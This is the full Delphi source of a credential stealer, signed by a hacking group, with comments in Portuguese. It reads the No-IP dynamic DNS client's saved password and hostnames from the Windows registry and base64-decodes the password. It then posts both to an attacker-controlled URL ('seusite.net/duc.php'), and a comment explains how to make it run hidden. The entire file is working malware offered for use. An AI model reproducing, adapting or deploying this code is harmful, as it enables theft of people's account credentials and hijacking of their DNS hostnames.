program stealer;

//Remova essa linha abaixo para que o programa rode invisível..
{$APPTYPE CONSOLE}

uses
  Windows,
  Classes,
  idHTTP;

type
  TFastDecodeTable=array[0..255] of byte;

var
Senha: string;
Host: string;
SZFastDecodeTable: TFastDecodeTable;

const
Codes64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';

//Função que serve para retirar os espaços
//em branco de uma string
//retirei da unit SysUtils..
function Trim(const S: string): string;
var
  I, L: Integer;
begin
  L := Length(S);
  I := 1;
  while (I <= L) and (S[I] <= ' ') do Inc(I);
  if I > L then Result := '' else
  begin
    while S[L] <= ' ' do Dec(L);
    Result := Copy(S, I, L - I + 1);
  end;
end;

//Ao invés de declarar Registry na uses
//preferi usar uma função usando chamadas API
//pois o programa ficaria maior usando o Registry
//para apenas usar uma função..
function PegaValor( const Key: HKEY; const Chave, Valor: String ) : String;
var handle : HKEY;
    Tipo, Tam : Cardinal;
    Buffer : String;
begin
    RegOpenKeyEx( Key,
                  PChar( Chave ),
                  0,
                  KEY_ALL_ACCESS,
                  handle );
    Tipo := REG_NONE;
    RegQueryValueEx( Handle,
                     PChar( Valor ),
                     nil,
                     @Tipo,
                     nil,
                     @Tam );

    SetString(Buffer, nil, Tam);
    RegQueryValueEx( Handle,
                     PChar( Valor ),
                     nil,
                     @Tipo,
                     PByte(PChar(Buffer)),
                     @Tam );

    Result := PChar(Buffer);
    RegCloseKey( handle );
    Result := PChar(Buffer);
end;

{
 ******************************************
 *          Base64 Decode                 *
 *                                        *
 * Créditos para http://www.szutils.net/  *
 ******************************************
}

procedure SZUpdateFastDecodeTable(const Codes: string);
var
  i: integer;
begin
  FillChar(SZFastDecodeTable,256,#0);

  for i := 1 to length(Codes) do
    SZFastDecodeTable[ byte( Codes[i] ) ] := i;
end;

function SZDecodeBaseXMemoryUpdate(pIN,pOUT: pByte; Size: integer; const FastDecodeTable: TFastDecodeTable; BITS: integer; var B8, I8 : integer): integer;
{
 Universal Decode algorithm for Base16, Base32 and Base64
 Reference: RFC 3548 - full compatibility
}

var
  i: Integer;
  TotalIN, Count: integer;

begin

  TotalIN  := Size;

  // Start decoding
  count := 0;
  for i := 1 to TotalIN do
  begin

    if SZFastDecodeTable[pIN^] > 0 then
    begin

      B8 := B8 shl BITS;
      B8 := B8 or (SZFastDecodeTable[pIN^]-1);

      I8 := I8 + BITS;

      while I8 >= 8 do
      begin
        I8 := I8 - 8;

        pOUT^ := Byte(B8 shr I8);
        inc( pOUT );

        inc(count)
      end;

      inc(pIN);
    end
    else if pIN^=13 then inc(pIN)
    else if pIN^=10 then inc(pIN)
    else
      break
  end;

  result:=Count;
end;

function SZDecodeBaseXMemory(pIN,pOUT: pByte; Size: integer; const Codes: string; BITS: integer): integer;
{
 Universal Decode algorithm for Base16, Base32 and Base64
 Reference: RFC 3548 - full compatibility
}

var
  B8, I8 : integer;
begin
  B8:=0;
  I8:=0;

  SZUpdateFastDecodeTable(Codes);

  result:=SZDecodeBaseXMemoryUpdate( pIN, pOUT, Size, SZFastDecodeTable, BITS, B8, I8);
end;

function SZDecodeBaseXString(const S: string; const Codes: String; BITS: integer): String;
var
  TotalIn  : integer;
  TotalOut : integer;

  pIN,pOUT: pByte;

begin
  TotalIn  := length(S);
  TotalOut := (TotalIn * BITS) div 8;
  Setlength(Result,TotalOut);
  pIN  := @S[1];
  pOUT := @Result[1];

  TotalOut:=SZDecodeBaseXMemory( pIN, pOUT, TotalIn, Codes, BITS);

  if length(Result)<> TotalOut then
    Setlength(Result,TotalOut);
end;

function SZDecodeBase64(const S: string): string; overload;
begin
  Result:=SZDecodeBaseXString(S, Codes64, 6)
end;
{
 ******************************************
 *    Base64 Decode - FIM das funções     *
 *                                        *
 * Créditos para http://www.szutils.net/  *
 ******************************************
}

function GravaDados(URL:string): boolean;
var
Dados: TStringList;
iHTTP: TIdHTTP;
begin
try
Dados:=TStringList.Create;
iHTTP:=TIdHTTP.Create(nil);
Dados.Add('Host='+Trim(Host));
Dados.Add('Senha='+Trim(Senha));
try
iHTTP.Post(URL,Dados);
except
end;
finally
Result:=true;
end;
end;

//Inicio do prog..
begin
Senha:=PegaValor(HKEY_LOCAL_MACHINE,'Software\Vitalwerks\DUC','Password');
Host:=PegaValor(HKEY_LOCAL_MACHINE,'Software\Vitalwerks\DUC','Checked');
Host:=Copy(Host,0,Length(Host)-1);
Senha:=SZDecodeBase64(Senha);
if GravaDados('http://seusite.net/duc.php') then
Exit
else begin
Sleep(2000);
GravaDados('http://seusite.net/duc.php');
end;
{
Se quiser testar, para que seja mostrado na tela:
WriteLn('Host: '+Host);
WriteLn('Senha: '+Senha);
ReadLn;


por whit3_sh4rk
http://www.nststuffs.kit.net

[Darkers Team]
}
end.
